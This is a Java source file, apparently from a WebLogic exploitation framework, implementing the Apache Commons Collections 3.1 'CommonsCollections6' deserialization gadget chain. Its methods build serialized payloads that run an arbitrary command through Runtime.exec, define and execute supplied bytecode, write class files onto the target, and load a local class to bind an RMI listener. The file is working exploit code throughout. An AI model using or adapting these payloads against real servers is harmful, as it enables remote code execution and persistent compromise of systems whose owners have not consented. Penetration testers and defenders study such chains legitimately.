/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.gadget.impl;

import com.r4v3zn.weblogic.framework.annotation.Authors;
import com.r4v3zn.weblogic.framework.annotation.Dependencies;
import com.r4v3zn.weblogic.framework.entity.GadgetParam;
import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
import com.r4v3zn.weblogic.framework.utils.ReflectionUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileOutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Title: CommonsCollections6Gadget
 * Desc: CommonsCollections6 Gadget
 * Gadget chain:
 *     java.io.ObjectInputStream.readObject()
 *         java.util.HashSet.readObject()
 *             java.util.HashMap.put()
 *             java.util.HashMap.hash()
 *                 org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 *                 org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 *                     org.apache.commons.collections.map.LazyMap.get()
 *                         org.apache.commons.collections.functors.ChainedTransformer.transform()
 *                         org.apache.commons.collections.functors.InvokerTransformer.transform()
 *                         java.lang.reflect.Method.invoke()
 *                             java.lang.Runtime.exec()
 * Date:2020/3/29 0:35
 * @author 0nise
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":commons-collections:commons-collections:3.1"})
public class CommonsCollections6Gadget implements ObjectGadget<Serializable> {

    /**
     * 获取序列化 payload (Runtime)
     * @param command 执行的命令
     * @return
     * @throws Exception
     */
    @Override
    public Serializable getObject(String command, URLClassLoader urlClassLoader) throws Exception {
        final String[] execArgs = new String[] { command };
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        return getObject(transformers);
    }

    /**
     * 获取序列化 payload
     * @param codeByte 需要序列化的字节码
     * @param bootArgs 执行中参数
     * @param className 反射的 class name
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(final byte[] codeByte, final String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Class.forName("org.mozilla.classfile.DefiningClassLoader")),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{className, codeByte}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{bootArgs}}),
                new ConstantTransformer(1) };
        return getObject(transformers);
    }

    @Override
    public Serializable getObject(GadgetParam param) throws Exception {
        String className = param.getClassName();
        byte[] codeByte = param.getCodeByte();
        String[] bootArgs = param.getBootArgs();
        return getObject(codeByte, bootArgs, className, null);
    }

    /**
     * 文件写入
     *
     * @throws Exception
     * @param param
     */
    @Override
    public Serializable getWriteFileObject(GadgetParam param) throws Exception {
        byte[] codeByte = param.getCodeByte();
        String className = param.getClassName()+".class";
        FileOutputStream.class.getConstructor(String.class).newInstance(className).write(codeByte);
        FileOutputStream.class.getConstructor(String.class).newInstance(className);
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.io.FileOutputStream.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{className}}),
                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{codeByte}),
                new ConstantTransformer(1) };
        return getObject(transformers);
    }

    /**
     * 加载文件
     *
     * @throws Exception
     * @param param
     */
    @Override
    public Serializable getLoadFileObject(GadgetParam param) throws Exception {
        String className = param.getClassName();
        String[] bootArgs = param.getBootArgs();
        URL url = new URL("file:./");
        URL[] urls = new URL[]{url};
        Transformer[] transformers = {
                new ConstantTransformer(java.net.URLClassLoader.class)
                , new InvokerTransformer("getConstructor", new Class[]{Class[].class} , new Object[]{new Class[]{URL[].class}})
                , new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{urls}})
                , new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className})
                , new InvokerTransformer("newInstance",null,null)
                , new InvokerTransformer("rmiBind",new Class[]{String.class},new String[]{bootArgs[0]})
        };
        return getObject(transformers);
    }

    /**
     * getObject
     * @param transformers transformers
     * @return
     * @throws Exception
     */
    private Serializable getObject(final Transformer[] transformers) throws Exception {
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        ReflectionUtils.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        ReflectionUtils.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        ReflectionUtils.setAccessible(keyField);
        keyField.set(node, entry);
        return map;
    }

}
